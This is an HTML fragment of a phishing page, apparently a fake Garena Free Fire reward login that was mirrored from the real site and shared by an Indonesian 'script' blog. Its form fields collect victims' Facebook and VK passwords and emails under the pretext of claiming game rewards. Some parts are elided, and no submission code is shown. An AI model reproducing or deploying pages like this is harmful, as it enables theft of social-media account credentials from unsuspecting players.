<!-- https://www.fhxploit.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
...
<span class="txt_c">Please log in.</span>
<br>

</center>
<label><font color="gold">Nickname Anda : </font></label>
<input  name="nickname"  placeholder="Your Nickname" type="text" required>


</a></span><span class="">
<center><div class="btn_fb"></center>
<label><font color="gold">Nama Facebook     : </font></label>
...
<br>
<label><font color="gold">Password Facebook : </font></label>
<br>
<input  name="pwfb"  placeholder="Password Facebok" type="text" required>

<br>
<center><div class="btn_vk"></center>
<label><font color="gold">Nomor Handphone Atau Alamat Email     : </font></label>
<input  name="emailvk"  placeholder="Nama Anda" type="text" required>
<br>
<label><font color="gold">Password VK Anda    : </font></label>
...
<!-- Mirrored from reward.ff.garena.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 14 Jul 2018 12:17:04 GMT -->
</html>